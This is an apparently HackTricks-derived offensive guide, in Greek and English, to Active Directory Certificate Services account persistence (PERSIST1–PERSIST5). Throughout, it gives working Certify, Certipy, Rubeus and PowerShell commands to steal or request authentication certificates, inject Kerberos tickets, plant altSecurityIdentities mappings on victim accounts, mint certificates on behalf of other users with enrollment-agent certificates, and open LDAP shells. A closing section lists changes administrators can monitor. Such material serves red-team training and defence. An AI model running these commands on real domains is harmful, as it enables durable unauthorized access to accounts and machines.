# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια σύντομη περίληψη των κεφαλαίων account persistence της εξαιρετικής έρευνας από [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Κατανόηση του Active User Credential Theft with Certificates – PERSIST1

Σε ένα σενάριο όπου ένα certificate που επιτρέπει domain authentication μπορεί να ζητηθεί από έναν user, ένας attacker έχει την ευκαιρία να ζητήσει και να κλέψει αυτό το certificate για να διατηρήσει persistence σε ένα network. Από προεπιλογή, το `User` template στο Active Directory επιτρέπει τέτοια requests, αν και μερικές φορές μπορεί να είναι απενεργοποιημένο.

Χρησιμοποιώντας [Certify](https://github.com/GhostPack/Certify) ή [Certipy](https://github.com/ly4k/Certipy), μπορείτε να αναζητήσετε enabled templates που επιτρέπουν client authentication και μετά να ζητήσετε ένα:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Η ισχύς ενός certificate έγκειται στην ικανότητά του να κάνει authenticate ως ο χρήστης στον οποίο ανήκει, ανεξάρτητα από αλλαγές κωδικού, όσο το certificate παραμένει valid.

Μπορείς να μετατρέψεις το PEM σε PFX και να το χρησιμοποιήσεις για να αποκτήσεις ένα TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Σημείωση: Σε συνδυασμό με άλλες τεχνικές (βλ. ενότητες THEFT), η certificate-based auth επιτρέπει επίμονη πρόσβαση χωρίς να αγγίζει το LSASS και ακόμη και από μη elevated contexts.

## Απόκτηση Machine Persistence με Certificates - PERSIST2

Αν ένας attacker έχει elevated privileges σε έναν host, μπορεί να enroll το machine account του compromised system για ένα certificate χρησιμοποιώντας το default `Machine` template. Το authenticating ως machine επιτρέπει S4U2Self για local services και μπορεί να παρέχει durable host persistence:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Επέκταση Persistence μέσω Certificate Renewal - PERSIST3

Η κατάχρηση των περιόδων ισχύος και ανανέωσης των certificate templates επιτρέπει σε έναν attacker να διατηρήσει μακροπρόθεσμη πρόσβαση. Αν κατέχεις ένα certificate που έχει εκδοθεί προηγουμένως και το private key του, μπορείς να το ανανεώσεις πριν από τη λήξη του για να αποκτήσεις ένα νέο, μακροχρόνιο credential χωρίς να αφήσεις επιπλέον request artifacts συνδεδεμένα με το αρχικό principal.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Παρακολουθείτε τα lifetimes στα attacker-held PFX files και ανανεώνετε νωρίς. Η ανανέωση μπορεί επίσης να κάνει τα updated certificates να περιλαμβάνουν το σύγχρονο SID mapping extension, διατηρώντας τα usable υπό stricter DC mapping rules (βλ. επόμενη ενότητα).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Αν μπορείτε να γράψετε στο `altSecurityIdentities` attribute ενός target account, μπορείτε να κάνετε explicit map ένα attacker-controlled certificate σε αυτόν τον account. Αυτό persists across password changes και, όταν χρησιμοποιείτε strong mapping formats, παραμένει functional υπό modern DC enforcement.

High-level flow:

1. Obtain or issue a client-auth certificate you control (e.g., enroll `User` template as yourself).
2. Extract a strong identifier from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Add an explicit mapping on the victim principal’s `altSecurityIdentities` using that identifier.
4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Στη συνέχεια, κάντε authenticate με το PFX σας. Το Certipy θα αποκτήσει απευθείας ένα TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Δημιουργία Ισχυρών `altSecurityIdentities` Mappings

Στην πράξη, τα **Issuer+Serial** και **SKI** mappings είναι οι πιο εύκολοι ισχυροί μορφότυποι για να δημιουργηθούν από ένα certificate που βρίσκεται στα χέρια του attacker. Αυτό έχει σημασία μετά τις **11 Φεβρουαρίου 2025**, όταν τα DCs προεπιλέγουν το **Full Enforcement** και τα weak mappings παύουν να είναι αξιόπιστα.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Χρησιμοποιήστε μόνο strong mapping types: `X509IssuerSerialNumber`, `X509SKI`, ή `X509SHA1PublicKey`. Οι weak formats (Subject/Issuer, Subject-only, RFC822 email) είναι deprecated και μπορούν να αποκλειστούν από DC policy.
- Το mapping λειτουργεί και σε αντικείμενα **user** και **computer**, οπότε το write access στο `altSecurityIdentities` ενός computer account αρκεί για persistence ως εκείνο το machine.
- Το cert chain πρέπει να χτίζει σε root trusted by the DC. Οι Enterprise CAs στο NTAuth είναι συνήθως trusted· ορισμένα environments εμπιστεύονται επίσης public CAs.
- Το Schannel authentication παραμένει χρήσιμο για persistence ακόμα και όταν το PKINIT αποτυγχάνει επειδή το DC δεν έχει το Smart Card Logon EKU ή επιστρέφει `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Σε **Windows Server 2022+** domain controllers patched με το **September 9, 2025** security update, η Microsoft πρόσθεσε ένα ακόμη strong explicit mapping format που είναι ελκυστικό για persistence επειδή επιβιώνει από certificate reissuance από το ίδιο CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Λειτουργικά αυτό διαφέρει από τις παλαιότερες ισχυρές μορφές:
- `Issuer+Serial` κάνει pin **ένα ακριβές certificate**.
- `SKI` / `SHA1-PUKEY` κάνουν pin **ένα keypair**.
- `Issuer/SID` κάνει pin το **issuing CA + target SID**, ώστε ανανεωμένα ή επανεκδοθέντα certificates από το ίδιο CA να συνεχίζουν να λειτουργούν χωρίς να ξαναγράφεται το `altSecurityIdentities`.

Απαιτήσεις και caveats
- Το certificate που παρουσιάζεται για logon πρέπει πραγματικά να περιέχει το target account SID στη SID security extension.
- Αυτή η μορφή δεν είναι χρήσιμη για `ESC9` / `ESC16` style certificates που παραλείπουν το SID extension· σε αυτές τις περιπτώσεις επέστρεψε σε `Issuer+Serial`, `SKI`, ή `SHA1-PUKEY`.

Για περισσότερα σχετικά με weak explicit mappings και attack paths, δες:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Αν αποκτήσεις ένα έγκυρο Certificate Request Agent/Enrollment Agent certificate, μπορείς να εκδίδεις νέα logon-capable certificates εκ μέρους χρηστών κατά βούληση και να κρατάς το agent PFX offline ως persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Η ανάκληση του certificate του agent ή των template permissions απαιτείται για να εκδιώξει αυτήν την persistence.

Operational notes
- Οι σύγχρονες εκδόσεις του `Certipy` υποστηρίζουν τόσο το `-on-behalf-of` όσο και το `-renew`, οπότε ένας attacker που κατέχει ένα Enrollment Agent PFX μπορεί να mint και αργότερα να renew leaf certificates χωρίς να ξαναγγίξει τον αρχικό target account.
- Αν η ανάκτηση TGT με βάση το PKINIT δεν είναι δυνατή, το resulting on-behalf-of certificate εξακολουθεί να είναι usable για Schannel authentication με `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

Αν το DC δεν έχει ένα Smart Card Logon-capable certificate, το certificate logon μέσω PKINIT μπορεί να αποτύχει με `KDC_ERR_PADATA_TYPE_NOSUPP`. Αυτό **δεν** καταστρέφει το persistence primitive: το ίδιο PFX είναι συχνά ακόμα usable για Schannel-authenticated LDAP access.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Αυτό είναι ιδιαίτερα χρήσιμο μετά το PERSIST4/PERSIST5 επειδή μπορείτε να συνεχίσετε να λειτουργείτε από Linux/macOS και να αλυσιδώνετε άλλες ενέργειες persistence στο directory, όπως το να ρίξετε [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ή να επεξεργαστείτε writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: Επίδραση στο Persistence

Το Microsoft KB5014754 εισήγαγε το Strong Certificate Mapping Enforcement στους domain controllers. Από τις **11 Φεβρουαρίου 2025**, οι DCs έχουν ως προεπιλογή το **Full Enforcement** για weak/ambiguous mappings, και από το security update της **9ης Σεπτεμβρίου 2025** τα patched DCs δεν υποστηρίζουν πλέον το παλιό Compatibility-mode fallback. Πρακτικές συνέπειες:

- Πιστοποιητικά προ του 2022 που δεν έχουν το SID mapping extension μπορεί να αποτύχουν στο implicit mapping όταν οι DCs είναι σε Full Enforcement. Οι attackers μπορούν να διατηρήσουν πρόσβαση είτε ανανεώνοντας τα certificates μέσω AD CS (για να αποκτήσουν το SID extension) είτε προσθέτοντας ένα ισχυρό explicit mapping στο `altSecurityIdentities` (PERSIST4).
- Τα explicit mappings που χρησιμοποιούν strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, και σε σύγχρονους DCs `Issuer/SID`) συνεχίζουν να λειτουργούν. Τα weak formats (Issuer/Subject, Subject-only, RFC822) μπορούν να μπλοκαριστούν και θα πρέπει να αποφεύγονται για persistence.
- Αν τα weak mappings φαίνεται ακόμα να λειτουργούν, θεωρήστε ότι βρήκατε unpatched ή διαφορετικά ρυθμισμένο DC και όχι μια αξιόπιστη μακροπρόθεσμη διαδρομή persistence.
- Τα `ESC9` / `ESC16` style issuance paths που καταστέλλουν το SID extension καθιστούν το `Issuer/SID` μη χρησιμοποιήσιμο, οπότε τα fallback strong mappings ή η ανανέωση μέσω ενός κανονικού template είναι η πρακτική επιλογή persistence.

Οι administrators θα πρέπει να παρακολουθούν και να κάνουν alert σε:
- Αλλαγές στο `altSecurityIdentities` και εκδόσεις/ανανεώσεις Enrollment Agent και User certificates.
- CA issuance logs για on-behalf-of requests και ασυνήθιστα renewal patterns.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
